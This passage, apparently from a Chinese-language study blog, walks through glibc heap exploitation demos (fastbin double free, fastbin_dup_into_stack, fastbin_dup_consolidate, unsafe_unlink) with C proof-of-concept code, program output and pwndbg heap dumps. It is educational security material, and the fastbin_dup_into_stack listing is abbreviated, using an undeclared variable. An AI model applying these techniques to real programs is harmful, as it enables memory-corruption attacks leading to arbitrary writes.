%s\n&quot;, a, a);</span><br><span class="line">   36 	fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.&quot;);</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 529, </span><br><span class="line">  fd = 0x7ffff7dd1d78 &lt;main_arena+600&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1d78 &lt;main_arena+600&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603210 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 528, </span><br><span class="line">  size = 273, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603320 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134369, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>此时，a指针和c指针指向同一个地址</li>
</ul>
<h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int *a = malloc(8);</span><br><span class="line">	int *b = malloc(8);</span><br><span class="line">	int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">	free(a);</span><br><span class="line">	free(b);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x207e010</span><br><span class="line">2nd malloc(8): 0x207e030</span><br><span class="line">3rd malloc(8): 0x207e050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x207e010 again, things will crash because 0x207e010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x207e030.</span><br><span class="line">Now, we can free 0x207e010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x207e010, 0x207e030, 0x207e010 ]. If we malloc 3 times, we&apos;ll get 0x207e010 twice!</span><br><span class="line">1st malloc(8): 0x207e010</span><br><span class="line">2nd malloc(8): 0x207e030</span><br><span class="line">3rd malloc(8): 0x207e010</span><br></pre></td></tr></table></figure>
<ul>
<li>分配3个块，a,b,c</li>
<li>释放区块a</li>
<li>这时候如果再次释放区块a,那么程序将会崩溃，因为a在空闲列表的顶端，所以释放区块b</li>
<li>第二次释放区块a</li>
<li>这时候，空闲列表中有3个区块，a -&gt; b -&gt; a</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x602020</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602020</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x602000</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602040</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20fa1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x602060</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">135073</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x602000</span> —▸ <span class="number">0x602020</span> ◂— <span class="number">0x602000</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>再次申请3个区块d,e,f，其中d和f将指向同一个地址</li>
</ul>
<p>这样，可以绕过fastbins的double free检查。</p>
<h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">	int *a = malloc(8);</span><br><span class="line">	int *b = malloc(8);</span><br><span class="line">	int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">	free(a);</span><br><span class="line">	free(b);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	stack_var = 0x20;</span><br><span class="line">	*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">	fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffcebcdf618.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xafe010</span><br><span class="line">2nd malloc(8): 0xafe030</span><br><span class="line">3rd malloc(8): 0xafe050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xafe010 again, things will crash because 0xafe010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0xafe030.</span><br><span class="line">Now, we can free 0xafe010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0xafe010, 0xafe030, 0xafe010 ]. We&apos;ll now carry out our attack by modifying data at 0xafe010.</span><br><span class="line">1st malloc(8): 0xafe010</span><br><span class="line">2nd malloc(8): 0xafe030</span><br><span class="line">Now the free list has [ 0xafe010 ].</span><br><span class="line">Now, we have access to 0xafe010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0xafe010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0xafe010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffcebcdf618</span><br></pre></td></tr></table></figure>
<ul>
<li>申请3个块，a,b,c</li>
<li>释放a</li>
<li>释放b</li>
<li>再次释放a</li>
<li>这时候，空闲列表  a -&gt; b -&gt; a</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x603020 ◂— 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p &amp;stack_var</span><br><span class="line">$4 = (unsigned long long *) 0x7fffffffdd10</span><br></pre></td></tr></table></figure>
<ul>
<li>再次申请2个区块d,e, 这时候，空闲列表头部将变为 a</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x603020 ◂— 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>修改stack_var的值为0x20</li>
<li>修改<em>\</em>d*的值为<code>&amp;stack_var - sizeof(d) = 0x7fffffffdd08</code>。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/x 0x603000</span><br><span class="line">0x603000:	0x0000000000000000</span><br><span class="line">pwndbg&gt; x/4xg 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x603010:	0x00007fffffffdd08	0x0000000000000000</span><br></pre></td></tr></table></figure>
<ul>
<li>这时候，空闲列表变为<code>a -&gt; 0x7fffffffdd08 -&gt; .....</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x7fffffffdd08 —▸ 0x603010 ◂— 0x0</span><br></pre></td></tr></table></figure>
<ul>
<li>申请一个区块</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x7fffffffdd08 —▸ 0x603010 ◂— 0x0</span><br></pre></td></tr></table></figure>
<ul>
<li>再次申请一个区块，该区块地址就是<code>0x7fffffffdd08</code></li>
</ul>
<p>总结: 漏洞利用uaf</p>
<h1 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1=0xee0010 p2=0xee0060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0xee00b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0xee0010 0xee0010</span><br></pre></td></tr></table></figure>
<ul>
<li>首先分配两个p1,p2，大小均为0x40</li>
<li>释放p1</li>
<li>申请一个0x400大小的区块p3，由于p3是large chunk，所以会触发<code>malloc_consolidate</code>操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing if there is space available, this avoids</span><br><span class="line">     fragmentation problems normally associated with fastbins.</span><br><span class="line">     Also, in practice, programs tend to have runs of either small or</span><br><span class="line">     large requests, but less often mixtures, so consolidation is not</span><br><span class="line">     invoked all that often in most programs. And the programs that</span><br><span class="line">     it is called frequently in otherwise tend to fragment.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      if (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 <code>malloc_consolidate()</code>函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。这个时候,p1就被放到small bins中,就可以再次释放 p1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x602000 ◂— 0x7ffff7dd1bb8</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>释放p1, 这时候，small bins和fast bins都包含p1</li>
<li>连续申请两个0x40大小的块，将指向同一个地址</li>
</ul>
<h1 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line"></span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">"Hello!~"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Original value: %s\n"</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"New Value: %s\n"</span>,victim_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Welcome to unsafe unlink 2.0!</span><br><span class="line">Tested in Ubuntu 14.04/16.04 64bit.</span><br><span class="line">This technique can be used when you have a pointer at a known location to a region you can call unlink on.</span><br><span class="line">The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.</span><br><span class="line">The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.</span><br><span class="line"></span><br><span class="line">The global chunk0_ptr is at 0x602070, pointing to 0x1d0b010</span><br><span class="line">The victim chunk we are going to corrupt is at 0x1d0b0a0</span><br><span class="line"></span><br><span class="line">We create a fake chunk inside chunk0.</span><br><span class="line">We setup the &apos;next_free_chunk&apos; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.</span><br><span class="line">We setup the &apos;previous_free_chunk&apos; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.</span><br><span class="line">With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</span><br><span class="line">Fake chunk fd: 0x602058</span><br><span class="line">Fake chunk bk: 0x602060</span><br><span class="line"></span><br><span class="line">We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.</span><br><span class="line">We shrink the size of chunk0 (saved as &apos;previous_size&apos; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.</span><br><span class="line">It&apos;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly</span><br><span class="line">If we had &apos;normally&apos; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80</span><br><span class="line">We mark our fake chunk as free by setting &apos;previous_in_use&apos; of chunk1 as False.</span><br><span class="line"></span><br><span class="line">Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.</span><br><span class="line">You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</span><br><span class="line"></span><br><span class="line">At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.</span><br><span class="line">chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.</span><br><span class="line">Original value: Hello!~</span><br><span class="line">New Value: BBBBAAAA</span><br></pre></td></tr></table></figure>
<p><strong>目的: 通过堆溢出，在释放堆块（不包括fastbin）时，调用unlink方法，实现任意地址写。</strong></p>
<ul>
<li>全局变量chunk0_ptr，申请0x80大小的chunk，地址保存在chunk0_ptr中</li>
<li>局部变量chunk1_ptr，申请0x80大小的chunk，地址保存在chunk1_ptr中</li>
</ul>
